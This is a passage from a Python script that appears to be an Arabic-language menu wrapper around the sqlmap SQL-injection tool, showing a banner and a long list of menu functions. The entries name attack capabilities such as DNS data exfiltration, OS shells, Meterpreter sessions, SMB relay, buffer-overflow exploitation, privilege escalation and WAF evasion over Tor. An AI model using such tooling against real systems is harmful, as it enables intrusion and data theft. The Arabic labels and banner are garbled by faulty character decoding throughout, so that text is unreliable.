тЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИ    тЦИтЦИ     тЦИтЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИтЦИтЦИтЦИ  тЦИтЦИ    тЦИтЦИ тЦИтЦИ    тЦИтЦИ  тЦИтЦИтЦИтЦИтЦИ  тЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИтЦИ    тЦИтЦИ 
тЦИтЦИ   тЦИтЦИ  тЦИтЦИ  тЦИтЦИ      тЦИтЦИ      тЦИтЦИ   тЦИтЦИ  тЦИтЦИ  тЦИтЦИ   тЦИтЦИ  тЦИтЦИ  тЦИтЦИ   тЦИтЦИ тЦИтЦИ   тЦИтЦИ тЦИтЦИтЦИтЦИ   тЦИтЦИ 
тЦИтЦИтЦИтЦИтЦИтЦИ    тЦИтЦИтЦИтЦИ       тЦИтЦИтЦИтЦИтЦИтЦИтЦИ тЦИтЦИтЦИтЦИтЦИтЦИтЦИ   тЦИтЦИтЦИтЦИ     тЦИтЦИтЦИтЦИ   тЦИтЦИтЦИтЦИтЦИтЦИтЦИ тЦИтЦИ   тЦИтЦИ тЦИтЦИ тЦИтЦИ  тЦИтЦИ 
тЦИтЦИ   тЦИтЦИ    тЦИтЦИ             тЦИтЦИ тЦИтЦИ   тЦИтЦИ    тЦИтЦИ       тЦИтЦИ    тЦИтЦИ   тЦИтЦИ тЦИтЦИ   тЦИтЦИ тЦИтЦИ  тЦИтЦИ тЦИтЦИ 
тЦИтЦИтЦИтЦИтЦИтЦИ     тЦИтЦИ        тЦИтЦИтЦИтЦИтЦИтЦИтЦИ тЦИтЦИ   тЦИтЦИ    тЦИтЦИ       тЦИтЦИ    тЦИтЦИ   тЦИтЦИ тЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИ   тЦИтЦИтЦИтЦИ 
                                                                                 
                                                                                 
""")
        delay_print("\nЁЯОп ╪з╪│╪к╪╣┘Е┘Д ┘З╪░┘З ╪з┘Д╪з╪п╪з╪й ┘Д╪║╪▒╪╢ ╪з┘Д╪к╪╣┘Д┘К┘Е ┘Б┘В╪╖", 0.01)
        delay_print("ЁЯТб ╪к┘Е ╪к╪╖┘И┘К╪▒┘З╪з ╪и╪з╪│╪к╪о╪п╪з┘Е ╪з┘Д╪░┘Г╪з╪б ╪з┘Д╪з╪╡╪╖┘Ж╪з╪╣┘К ┘Д╪п╪╣┘Е ╪з┘Д╪з╪│╪к╪о╪п╪з┘Е ╪з┘Д╪г╪о┘Д╪з┘В┘К", 0.01)

        print("\nЁЯФ╣ ╪з┘Д┘В╪з╪ж┘Е╪й ╪з┘Д╪▒╪ж┘К╪│┘К╪й - ╪з╪о╪к╪▒ ┘Е┘З┘Е╪й ЁЯФ╣")

        functions = [
            ("╪з╪│╪к┘З╪п╪з┘Б ╪▒╪з╪и╪╖ URL", target_url),
            ("╪з┘Д╪з╪к╪╡╪з┘Д ╪и┘В╪з╪╣╪п╪й ╪и┘К╪з┘Ж╪з╪к ┘Е╪и╪з╪┤╪▒╪й", data_direct_conncet),
            ("╪к╪н┘Д┘К┘Д ┘Е┘Д┘Б Log", log_analyze),
            ("┘Б╪н╪╡ ╪▒┘И╪з╪и╪╖ ┘Е╪к╪╣╪п╪п╪й ┘Е┘Ж ┘Е┘Д┘Б", scan_files_url),
            ("╪к╪н┘Е┘К┘Д ╪╖┘Д╪и HTTP ┘Е┘Ж ┘Е┘Д┘Б", http_request),
            ("┘Б╪н╪╡ ╪и╪з╪│╪к╪о╪п╪з┘Е Google Dork", gdrok),
            ("╪к╪н┘Е┘К┘Д ╪е╪╣╪п╪з╪п╪з╪к ┘Е┘Ж ┘Е┘Д┘Б INI", ini_setting),
            ("╪к╪┤╪║┘К┘Д ╪з┘Д┘И╪╢╪╣ ╪з┘Д╪е╪▒╪┤╪з╪п┘К (wizard)", tool_wizard),
            ("╪к╪н╪п┘К╪л ╪з┘Д╪г╪п╪з╪й ╪е┘Д┘Й ╪г╪н╪п╪л ╪е╪╡╪п╪з╪▒", tool_base_update),
            ("╪н╪░┘Б ┘Е╪м┘Д╪п ╪з┘Д╪и┘К╪з┘Ж╪з╪к ╪и╪з┘Д┘Г╪з┘Е┘Д", delete),
            ("╪н╪░┘Б ┘Е╪м┘Д╪п ╪з┘Д┘Ж╪к╪з╪ж╪м ┘Б┘В╪╖", out_del),
            ("┘Б╪н╪╡ ╪з┘Д┘Е╪к╪╖┘Д╪и╪з╪к ┘И╪з┘Д┘Е┘Г╪к╪и╪з╪к", req_check),
            ("╪╣╪▒╪╢ ╪з┘Д┘Е╪│╪з╪╣╪п╪й ╪з┘Д┘Г╪з┘Е┘Д╪й", help_n_a),
            ("╪╣╪▒╪╢ ╪е╪╡╪п╪з╪▒ sqlmap", sqlmap_version),
            ("╪к┘Б╪╣┘К┘Д ╪м┘Е┘К╪╣ ╪з┘Д╪к╪н╪│┘К┘Ж╪з╪к ╪к┘Д┘В╪з╪ж┘К╪з┘Л", opt_options),
            ("╪к┘И┘В╪╣ ┘Ж╪к╪з╪ж╪м ╪з┘Д╪з╪│╪к╪╣┘Д╪з┘Е╪з╪к", pre_out),
            ("╪з╪│╪к╪о╪п╪з┘Е ╪з╪к╪╡╪з┘Д╪з╪к HTTP ┘Е╪│╪к┘Е╪▒╪й", http_alive),
            ("╪м┘Д╪и ╪╖┘И┘Д ╪з┘Д╪╡┘Б╪н╪й ┘Б┘В╪╖ ╪и╪п┘И┘Ж ╪з┘Д┘Е╪н╪к┘И┘Й", ignore_html_content),
            ("╪╣╪п╪п ╪з┘Д╪з╪к╪╡╪з┘Д╪з╪к ╪з┘Д┘Е╪к╪▓╪з┘Е┘Ж╪й", num_threads),
            ("╪к┘Б╪╣┘К┘Д ╪з┘Д╪▒┘Е┘И╪▓ ╪з┘Д┘Е╪о╪к╪╡╪▒╪й ┘Б┘К ╪з┘Д╪е╪о╪▒╪з╪м", use_mnemonics),
            ("╪к╪┤╪║┘К┘Д ╪г┘Е╪▒ ╪╣┘Ж╪п ╪з┘Д╪╣╪л┘И╪▒ ╪╣┘Д┘Й ╪н┘В┘Ж", alert_command),
            ("╪к╪┤╪║┘К┘Д ╪╡┘И╪к ╪╣┘Ж╪п ╪з┘Д╪╣╪л┘И╪▒ ╪╣┘Д┘Й ╪л╪║╪▒╪й", beep_on_found),
            ("╪к╪╣╪╖┘К┘Д ╪к┘Д┘И┘К┘Ж ╪з┘Д┘Е╪о╪▒╪м╪з╪к", disable_coloring),
            ("╪╣╪▒╪╢ ╪│┘Г╪▒╪и╪к╪з╪к ╪з┘Д╪к┘Д╪з╪╣╪и ╪з┘Д┘Е╪к╪з╪н╪й", list_tampers),
            ("╪з┘Д╪╣┘Е┘Д ╪и╪п┘И┘Ж ╪з╪к╪╡╪з┘Д ╪и╪з┘Д╪е┘Ж╪к╪▒┘Ж╪к", offline_mode),
            ("╪н┘Б╪╕ ╪з┘Д┘Ж╪к╪з╪ж╪м ╪е┘Д┘Й ┘Е┘Д┘Б CSV", results_to_file),
            ("┘Б╪к╪н shell ╪к┘Б╪з╪╣┘Д┘К ┘Е╪╣ sqlmap", sqlmap_shell),
            ("╪к╪н╪п┘К╪п ┘Е╪м┘Д╪п ┘Е╪д┘В╪к ┘Д┘Д┘Е┘Д┘Б╪з╪к", set_tmp_dir),
            ("╪к┘Б╪╣┘К┘Д ╪з┘Д┘И╪╢╪╣ ╪║┘К╪▒ ╪з┘Д┘Е╪│╪к┘В╪▒", unstable_mode),
            ("╪з╪о╪к┘К╪з╪▒ ╪к┘В┘Ж┘К╪з╪к ╪з┘Д╪н┘В┘Ж ╪з┘Д┘Е╪│╪к╪о╪п┘Е╪й", choose_technique),
            ("╪╢╪и╪╖ ╪к╪г╪о┘К╪▒ ╪з┘Д╪з╪│╪к╪м╪з╪и╪й ╪з┘Д╪▓┘Е┘Ж┘К╪й", time_based_delay),
            ("╪к╪н╪п┘К╪п ┘Ж╪╖╪з┘В ╪г╪╣┘Е╪п╪й UNION", union_columns_range),
            ("╪к╪н╪п┘К╪п ╪з┘Д╪н╪▒┘Б ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Б┘К UNION", union_char),
            ("╪к╪н╪п┘К╪п ╪м╪п┘И┘Д ┘Б┘К ╪м┘Е┘Д╪й FROM", union_from_table),
            ("┘З╪м┘И┘Е ╪з╪│╪к╪о╪▒╪з╪м ╪з┘Д╪и┘К╪з┘Ж╪з╪к ╪╣╪и╪▒ DNS", dns_exfiltration),
            ("╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Д┘Д╪з╪│╪к╪м╪з╪и╪й ┘Е┘Ж ╪з┘Д┘Ж┘И╪╣ ╪з┘Д╪л╪з┘Ж┘К", second_order_url),
            ("╪к╪н┘Е┘К┘Д ╪╖┘Д╪и HTTP ┘Е┘Ж ╪з┘Д┘Ж┘И╪╣ ╪з┘Д╪л╪з┘Ж┘К", second_order_request_file),
            ("╪╣┘Е┘Д fingerprint ╪┤╪з┘Е┘Д", full_fingerprint),
            ("╪е╪╣╪п╪з╪п╪з╪к ╪з┘Д╪╖┘Д╪и HTTP", request_options),
            ("╪е╪╣╪п╪з╪п╪з╪к ┘Е╪к┘В╪п┘Е╪й ┘Д┘Д╪╖┘Д╪и", advanced_request_options),
            ("╪к┘Б╪╣┘К┘Д Tor", use_tor),
            ("╪к╪н╪п┘К╪п ┘Е┘Ж┘Б╪░ Tor", set_tor_port),
            ("╪к╪н╪п┘К╪п ┘Ж┘И╪╣ Tor Proxy", set_tor_type),
            ("╪з┘Д╪к╪н┘В┘В ┘Е┘Ж ╪╣┘Е┘Д Tor", check_tor),
            ("╪к╪н╪п┘К╪п ╪к╪г╪о┘К╪▒ ╪и┘К┘Ж ╪з┘Д╪╖┘Д╪и╪з╪к", set_delay),
            ("╪╢╪и╪╖ ┘Е┘З┘Д╪й ╪з┘Д╪з╪к╪╡╪з┘Д", set_timeout),
            ("╪╢╪и╪╖ ╪╣╪п╪п ╪з┘Д┘Е╪н╪з┘И┘Д╪з╪к", set_retries),
            ("╪к╪║┘К┘К╪▒ ╪╣╪┤┘И╪з╪ж┘К ┘Д┘Д┘Е╪╣╪з┘Е┘Д╪з╪к", randomize_param),
            ("╪▒╪з╪и╪╖ ╪в┘Е┘Ж ┘Д╪▓┘К╪з╪▒╪к┘З ╪г╪л┘Ж╪з╪б ╪з┘Д┘Б╪н╪╡", safe_url),
            ("╪и┘К╪з┘Ж╪з╪к POST ┘Д┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж", safe_post),
            ("╪к╪н┘Е┘К┘Д ╪╖┘Д╪и ╪в┘Е┘Ж ┘Е┘Ж ┘Е┘Д┘Б", safe_req),
            ("╪╣╪п╪п ╪з┘Д╪╖┘Д╪и╪з╪к ╪з┘Д╪╣╪з╪п┘К╪й ╪и┘К┘Ж ╪з┘Д╪▓┘К╪з╪▒╪з╪к ╪з┘Д╪в┘Е┘Ж╪й", safe_freq),
            ("╪к╪о╪╖┘К ╪к╪▒┘Е┘К╪▓ URL", skip_urlencode),
            ("╪к╪н╪п┘К╪п ╪з╪│┘Е ┘Е╪к╪║┘К╪▒ CSRF", csrf_token),
            ("╪▒╪з╪и╪╖ ╪╡┘Б╪н╪й ╪з╪│╪к╪о╪▒╪з╪м CSRF", csrf_url),
            ("╪╖╪▒┘К┘В╪й ╪з╪│╪к╪о╪▒╪з╪м CSRF", csrf_method),
            ("╪╣╪п╪п ┘Е╪н╪з┘И┘Д╪з╪к ╪з╪│╪к╪о╪▒╪з╪м CSRF", csrf_retries),
            ("┘Б╪▒╪╢ ╪з╪│╪к╪о╪п╪з┘Е HTTPS", force_ssl),
            ("╪к┘Б╪╣┘К┘Д chunked encoding", chunked),
            ("╪к┘Б╪╣┘К┘Д HPP", hpp),
            ("╪к╪┤╪║┘К┘Д ┘Г┘И╪п Python ┘Е╪о╪╡╪╡", eval_code),
            ("╪к╪н╪п┘К╪п ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ┘Д┘Д╪з╪о╪к╪и╪з╪▒", set_test_param),
            ("╪к╪о╪╖┘К ┘Е╪╣╪з┘Е┘Д╪з╪к ┘Е╪╣┘К┘Ж╪й", skip_params),
            ("╪к╪о╪╖┘К ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ╪з┘Д╪л╪з╪и╪к╪й", skip_static_params),
            ("╪з╪│╪к╪и╪╣╪з╪п ┘Е╪╣╪з┘Е┘Д╪з╪к ╪и╪з╪│╪к╪о╪п╪з┘Е regex", param_exclude),
            ("╪к╪╡┘Б┘К╪й ╪н╪│╪и ┘Е┘Г╪з┘Ж ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к", param_filter),
            ("┘Б╪▒╪╢ ┘Ж┘И╪╣ ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к", force_dbms),
            ("╪к╪н╪п┘К╪п ╪и┘К╪з┘Ж╪з╪к ╪з╪╣╪к┘Е╪з╪п ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к", dbms_credentials),
            ("┘Б╪▒╪╢ ┘Ж╪╕╪з┘Е ╪к╪┤╪║┘К┘Д ╪з┘Д┘В╪з╪╣╪п╪й", force_os),
            ("┘В┘К┘Е ╪е┘Д╪║╪з╪б ┘И┘З┘Е┘К╪й ┘Г╪и┘К╪▒╪й", invalid_bignum),
            ("┘В┘К┘Е ╪е┘Д╪║╪з╪б ╪и╪з╪│╪к╪о╪п╪з┘Е ┘Е┘Ж╪╖┘В", invalid_logical),
            ("┘В┘К┘Е ╪е┘Д╪║╪з╪б ┘Ж╪╡┘К╪й", invalid_string),
            ("╪к╪╣╪╖┘К┘Д ╪з┘Д╪к╪н┘И┘К┘Д╪з╪к", no_cast),
            ("╪к╪╣╪╖┘К┘Д ╪з┘Д┘З╪▒┘И╪и ╪з┘Д┘Ж╪╡┘К", no_escape),
            ("╪е╪╢╪з┘Б╪й ╪и╪з╪п╪ж╪й ┘Д┘Д╪н┘Е┘И┘Д╪й", prefix_payload),
            ("╪е╪╢╪з┘Б╪й ┘Д╪з╪н┘В╪й ┘Д┘Д╪н┘Е┘И┘Д╪й", suffix_payload),
            ("╪з╪│╪к╪о╪п╪з┘Е ╪│┘Г╪▒╪и╪к╪з╪к tamper", tamper_scripts),
            ("╪к┘Ж┘Б┘К╪░ ╪г┘Е╪▒ ┘Ж╪╕╪з┘Е", os_cmd),
            ("┘Б╪к╪н shell ┘Ж╪╕╪з┘Е", os_shell),
            ("┘Б╪к╪н ╪м┘Д╪│╪й Meterpreter/VNC", os_pwn),
            ("┘З╪м┘И┘Е SMB relay", os_smbrelay),
            ("╪з╪│╪к╪║┘Д╪з┘Д Buffer Overflow", os_bof),
            ("╪▒┘Б╪╣ ╪╡┘Д╪з╪н┘К╪з╪к ╪з┘Д┘Е╪│╪к╪о╪п┘Е", priv_esc),
            ("╪к╪н╪п┘К╪п ┘Е╪│╪з╪▒ Metasploit", msf_path),
            ("╪к╪н╪п┘К╪п ┘Е╪м┘Д╪п ┘Е╪д┘В╪к ╪╣┘Ж ╪и┘П╪╣╪п", tmp_path),
            ("╪к╪н┘Е┘К┘Д ╪м┘Д╪│╪й ┘Е╪н┘Б┘И╪╕╪й", load_session),
            ("╪к╪│╪м┘К┘Д ╪н╪▒┘Г╪й HTTP ┘Б┘К ┘Е┘Д┘Б", log_http_traffic),
            ("╪к╪╣┘К┘К┘Ж ╪е╪м╪з╪и╪з╪к ┘Е╪│╪и┘В╪й", set_answers),
            ("╪к╪╣┘К┘К┘Ж ╪и╪▒╪з┘Е┘К╪к╪▒╪з╪к Base64", set_base64_params),
            ("╪з╪│╪к╪о╪п╪з┘Е Base64 ╪в┘Е┘Ж", use_base64_safe),
            ("╪к┘Б╪╣┘К┘Д ┘И╪╢╪╣ batch", batch_mode),
            ("╪з┘Д╪н┘В┘И┘Д ╪з┘Д╪л┘Ж╪з╪ж┘К╪й ┘Б┘К ╪з┘Д┘Ж╪к╪з╪ж╪м", set_binary_fields),
            ("┘Б╪н╪╡ ╪з╪к╪╡╪з┘Д ╪з┘Д╪е┘Ж╪к╪▒┘Ж╪к", check_internet_connection),
            ("╪к┘Ж╪╕┘К┘Б ┘В┘И╪з╪╣╪п ╪и┘К╪з┘Ж╪з╪к sqlmap", cleanup_sqlmap),
            ("╪з┘Д╪▓╪н┘Б ╪╣┘Д┘Й ╪з┘Д┘Е┘И┘В╪╣", crawl_site),
            ("╪з╪│╪к╪л┘Ж╪з╪б ╪╡┘Б╪н╪з╪к ┘Е┘Ж ╪з┘Д╪▓╪н┘Б", crawl_exclude_pages),
            ("╪к╪╣┘К┘К┘Ж ┘Б╪з╪╡┘Д CSV", set_csv_delimiter),
            ("╪к╪╣┘К┘К┘Ж charset ┘Д┘А Blind SQLi", set_charset),
            ("╪к╪н╪п┘К╪п ╪╡┘К╪║╪й ╪з╪│╪к╪о╪▒╪з╪м ╪з┘Д╪и┘К╪з┘Ж╪з╪к", set_dump_format),
            ("╪к╪╣┘К┘К┘Ж ╪к╪▒┘Е┘К╪▓ ╪з┘Д╪г╪н╪▒┘Б", set_encoding),
            ("╪╣╪▒╪╢ ╪з┘Д┘И┘В╪к ╪з┘Д┘Е╪к┘И┘В╪╣ ┘Д┘Д┘Ж╪к╪з╪ж╪м", show_eta),
            ("┘Е╪│╪н ┘Е┘Д┘Б╪з╪к ╪з┘Д╪м┘Д╪│╪й", flush_session_files),
            ("╪к╪н┘Д┘К┘Д ╪з┘Д┘Ж┘Е╪з╪░╪м Forms", parse_forms),
            ("╪к╪м╪з┘З┘Д ╪з╪│╪к╪╣┘Д╪з┘Е╪з╪к ╪з┘Д╪м┘Д╪│╪й ╪з┘Д╪│╪з╪и┘В╪й", ignore_fresh_queries),
            ("Google Dork ┘Е┘Ж ╪╡┘Б╪н╪й ┘Е╪н╪п╪п╪й", use_google_page),
            ("╪к╪│╪м┘К┘Д HAR", log_har_file),
            ("╪з╪│╪к╪о╪п╪з┘Е hex ╪г╪л┘Ж╪з╪б ╪з┘Д╪з╪│╪к╪▒╪м╪з╪╣", use_hex),
            ("╪к╪н╪п┘К╪п ┘Е╪м┘Д╪п ╪з┘Д╪е╪о╪▒╪з╪м", set_output_dir),
            ("╪к╪н┘Д┘К┘Д ╪г╪о╪╖╪з╪б DB", parse_db_errors),
            ("╪│┘Г╪▒┘К╪и╪к╪з╪к ┘Е╪з ┘В╪и┘Д ╪з┘Д┘Е╪╣╪з┘Д╪м╪й", preprocess_script),
            ("╪│┘Г╪▒┘К╪и╪к╪з╪к ┘Е╪з ╪и╪╣╪п ╪з┘Д┘Е╪╣╪з┘Д╪м╪й", postprocess_script),
            ("╪е╪╣╪з╪п╪й ╪з╪│╪к╪о╪▒╪з╪м ╪з┘Д╪│╪м┘Д╪з╪к ╪з┘Д╪║╪з┘Е╪╢╪й", repair_entries),
            ("╪н┘Б╪╕ ╪з┘Д╪е╪╣╪п╪з╪п╪з╪к ┘Б┘К ┘Е┘Д┘Б INI", save_config),
            ("╪к╪н╪п┘К╪п ┘Ж╪╖╪з┘В ╪з┘Д┘З╪п┘Б", set_scope),
            ("╪к╪о╪╖┘К ╪з┘Д┘Г╪┤┘Б heuristic", skip_heuristics),
            ("╪к╪о╪╖┘К ╪з┘Д┘Г╪┤┘Б WAF", skip_waf),
            ("╪и╪з╪п╪ж╪й ┘Д┘Д╪м╪п╪з┘И┘Д ╪з┘Д┘Е╪д┘В╪к╪й", set_table_prefix),
            ("╪к╪н╪п┘К╪п ╪з╪о╪к╪и╪з╪▒╪з╪к ┘Е╪о╪╡╪╡╪й", set_test_filter),
            ("╪к╪о╪╖┘К ╪з╪о╪к╪и╪з╪▒╪з╪к ┘Е╪о╪╡╪╡╪й", set_test_skip),
            ("╪м╪░╪▒ ╪з┘Д╪│┘К╪▒┘Б╪▒ Web Root", set_web_root),
        ]

        for idx, (label, _) in enumerate(functions, 1):
            print(f"[{idx}] {label}")
        print("[0] ╪о╪▒┘И╪м")

        choice = i("\n╪г╪п╪о┘Д ╪▒┘В┘Е ╪з┘Д╪о┘К╪з╪▒: ").strip()

        if choice == "0":
            p("\nЁЯСЛ ╪к┘Е ╪з┘Д╪о╪▒┘И╪м. ╪п┘П┘Е╪к ┘Б┘К ╪г┘Е╪з┘Ж ╪з┘Д┘Д┘З.")
            break

        if choice.isdigit() and 1 <= int(choice) <= len(functions):
            _, func = functions[int(choice)-1]
            try:
                func()
            except Exception as e:
                p("тЪая╕П ╪н╪п╪л ╪о╪╖╪г ┘Б┘К ╪к┘Ж┘Б┘К╪░ ╪з┘Д┘Е┘З┘Е╪й.")
                logging.error(e)
                ai_help(str(e))
        else:
            p("тЭМ ╪о┘К╪з╪▒ ╪║┘К╪▒ ╪╡╪н┘К╪н.")

        input("\nтЖйя╕П ╪з╪╢╪║╪╖ Enter ┘Д┘Д╪╣┘И╪п╪й ┘Д┘Д┘В╪з╪ж┘Е╪й ...")
        

#┘Д╪к╪┤╪║┘К┘Д ╪з┘Д┘Г┘И╪п
main_menu()